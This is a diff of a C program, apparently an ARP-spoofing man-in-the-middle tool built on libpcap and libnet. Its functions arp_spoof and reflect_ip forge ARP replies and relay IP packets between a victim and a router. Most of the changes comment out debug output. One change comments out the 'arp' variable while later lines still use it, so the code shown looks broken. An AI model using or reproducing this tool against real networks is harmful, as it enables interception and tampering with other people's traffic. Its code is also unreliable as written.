@@ -107,9 +107,9 @@ const struct sniff_arp* strip_arp(const struct pcap_pkthdr *header, const u_char
 const struct sniff_ip* strip_ip(const struct pcap_pkthdr *header, const u_char *packet){
 	const struct sniff_ip *ip;
 	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
-	printf("Calling IP_HL\n");
+	//printf("Calling IP_HL\n");
 	int size_ip = IP_HL(ip)*4;
-	printf("Checking ip header length\n");
+	//printf("Checking ip header length\n");
 	if (size_ip < 20) {
 		printf("   * Invalid IP header length: %u bytes\n", size_ip);
 		return NULL;
@@ -119,18 +119,10 @@ const struct sniff_ip* strip_ip(const struct pcap_pkthdr *header, const u_char *
 
 int reflect_ip(u_int8_t *src_mac, u_int32_t src_ip, const struct sniff_ethernet *ethernet, const struct sniff_ip *ip, const u_char *payload, u_int32_t payload_s){
 	libnet_clear_packet(ln_context);
-	//u_char n_payload[payload_s];
-	/*int i;
-	printf("Payload: \"");
-	for(i = 0; i < payload_s; i++)
-		printf("%x", payload[i]);
-		//n_payload[i] = payload[payload_s-(i+1)];
-	printf("\"\n");*/
+
 	if(ip->ip_p == IPPROTO_TCP){
-		//u_int size_ip;
 		u_int size_tcp;	
 		const struct sniff_tcp *tcp; /* The TCP header */
-		//size_ip = IP_HL(ip)*4;
 		tcp = (struct sniff_tcp*)(payload);
 		size_tcp = TH_OFF(tcp)*4;
 		if (size_tcp < 20) {
@@ -193,7 +185,7 @@ int reflect_ip(u_int8_t *src_mac, u_int32_t src_ip, const struct sniff_ethernet 
     		exit(0);
   	}
 	// Construct Ethernet header
-	printf("Ether_type: %hu\n", ethernet->ether_type);
+	//printf("Ether_type: %hu\n", ethernet->ether_type);
 	if ( libnet_build_ethernet(ethernet->ether_shost, src_mac, ETHERTYPE_IP, 
 		NULL, 0, ln_context, 0) == -1 )
   	{
@@ -204,7 +196,8 @@ int reflect_ip(u_int8_t *src_mac, u_int32_t src_ip, const struct sniff_ethernet 
   	}
 	int bytes_written = libnet_write(ln_context);
 	if ( bytes_written != -1 )
-    		printf("%d bytes written.\n", bytes_written);
+		;
+    		//printf("%d bytes written.\n", bytes_written);
   	else
     		fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(ln_context));
 	return bytes_written;
@@ -213,44 +206,6 @@ int reflect_ip(u_int8_t *src_mac, u_int32_t src_ip, const struct sniff_ethernet 
 int arp_spoof(u_int8_t *src_mac, u_int32_t src_ip, const struct sniff_ethernet *ethernet, const struct sniff_arp *arp){
 	libnet_clear_packet(ln_context);
 	// Construct ARP header
-	int i;				      
-	printf("Sending values:\n");
-	printf("Sender MAC: "); 
-    for(i=0; i<6;i++)
-        printf("%02X:", arp->sha[i]); 
-
-
-    printf("\nSender IP: "); 
-    for(i=0; i<4; i++)
-        printf("%d.", arp->spa[i]);
-
-
-    printf("\nTarget MAC: "); 
-
-    for(i=0; i<6;i++)
-        printf("%02X:", src_mac[i]); 
-
-    printf("\nTarget IP: "); 
-    for(i=0; i<4;i++)
-        printf("%d.", arp->tpa[i]); 
-	
-	printf("\n");
-	
-	/*u_int8_t *dst_mac;
-	u_int32_t dst_ip;
-	int length;
-	dst_mac = libnet_hex_aton(arp->sha, &length);
-	if(dst_mac == NULL){
-		printf("Error converting relayer mac address\n");
-		return(0);
-	}
-	dst_ip = libnet_name2addr4(ln_context, arp->spa, LIBNET_DONT_RESOLVE);
-	if(dst_ip == -1){
-		printf("Error converting relayer ip address\n");
-		return(0);
-	}*/
-	
-	
 	if ( libnet_autobuild_arp (ARPOP_REPLY,
 		src_mac,
       		(u_int8_t *)(&src_ip),
@@ -262,10 +217,10 @@ int arp_spoof(u_int8_t *src_mac, u_int32_t src_ip, const struct sniff_ethernet *
     		libnet_destroy(ln_context);
     		exit(0);
   	}
-	printf("Constructing ethernet header\n");
+	//printf("Constructing ethernet header\n");
 	// Construct Ethernet header
-	const char *aux = ether_ntoa((struct ether_addr *)ethernet->ether_shost);
-	printf("Source ethernet: %s\n", aux);
+	//const char *aux = ether_ntoa((struct ether_addr *)ethernet->ether_shost);
+	//printf("Source ethernet: %s\n", aux);
 	if ( libnet_build_ethernet(arp->sha, src_mac, ETHERTYPE_ARP, 
 		NULL, 0, ln_context, 0) == -1 )
   	{
@@ -274,17 +229,16 @@ int arp_spoof(u_int8_t *src_mac, u_int32_t src_ip, const struct sniff_ethernet *
     		libnet_destroy(ln_context);
     		exit(0);
   	}
-	printf("Writing arp reply\n");
+	//printf("Writing arp reply\n");
 	int bytes_written = libnet_write(ln_context);
 	if ( bytes_written != -1 )
-    		printf("%d bytes written.\n", bytes_written);
+		;
+    		//printf("%d bytes written.\n", bytes_written);
   	else
     		fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(ln_context));
 	return bytes_written;
 }
 void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
-	printf("Sending response from victim to attacker\n");
-	
 	const struct sniff_ethernet *ethernet;
 	ethernet = strip_ethernet(header, packet);
 	struct ether_header *eptr = (struct ether_header *) packet;
@@ -293,10 +247,10 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 	// Do a couple of checks to see what packet type we have..
 	if (ntohs (eptr->ether_type) == ETHERTYPE_IP)
     	{
-        printf("Ethernet type hex:%x dec:%d is an IP packet\n",
+        /*printf("Ethernet type hex:%x dec:%d is an IP packet\n",
                 ntohs(eptr->ether_type),
                 ntohs(eptr->ether_type));
-		printf("Size of r_mac: %lu\n", sizeof(r_mac));
+		printf("Size of r_mac: %lu\n", sizeof(r_mac));*/
 		if(memcmp(ethernet->ether_dhost, r_mac, 6) == 0){
 			src_mac = v_mac;
 			src_ip = v_ip;
@@ -312,7 +266,7 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 		//const u_char *payload;
 		//u_int32_t payload_s;
 		u_int size_ip = IP_HL(ip)*4;
-		printf("Checking ip header length\n");
+		//printf("Checking ip header length\n");
 		if (size_ip < 20) {
 			printf("   * Invalid IP header length: %u bytes\n", size_ip);
 			return;
@@ -320,16 +274,16 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 		const u_char *ip_payload = (u_char *)(packet + SIZE_ETHERNET + size_ip);
 		u_int32_t ip_payload_s = header->len - (SIZE_ETHERNET + size_ip);
 		reflect_ip(src_mac, src_ip, ethernet, ip, ip_payload, ip_payload_s);
-		printf("Finished reflecting IP packet\n");
+		//printf("Finished reflecting IP packet\n");
 		return;
     	}else  if (ntohs (eptr->ether_type) == ETHERTYPE_ARP)
     	{
-        printf("Ethernet type hex:%x dec:%d is an ARP packet\n",
+        /*printf("Ethernet type hex:%x dec:%d is an ARP packet\n",
                 ntohs(eptr->ether_type),
                 ntohs(eptr->ether_type));
 		const struct sniff_arp *arp;
 		arp = strip_arp(header, packet);
-		printf("Size of r_mac: %lu\n", sizeof(r_mac));
+		printf("Size of r_mac: %lu\n", sizeof(r_mac));*/
 		if(memcmp(arp->tpa, &r_ip, 4) == 0){
 			src_mac = r_mac;
 			src_ip = r_ip;
@@ -341,13 +295,12 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 			return;
 		}		
 		arp_spoof(src_mac, src_ip, ethernet, arp);
-		printf("Finished spoofing ARP response\n");
+		//printf("Finished spoofing ARP response\n");
 		return;
     	}else {
-        	printf("Ethernet type %x not IP", ntohs(eptr->ether_type));
-        	//exit(1);
+        	printf("Ethernet type %x not IP\n", ntohs(eptr->ether_type));
     	}
-        printf("\n");
+        //printf("\n");
 	
 											  
 	return;	
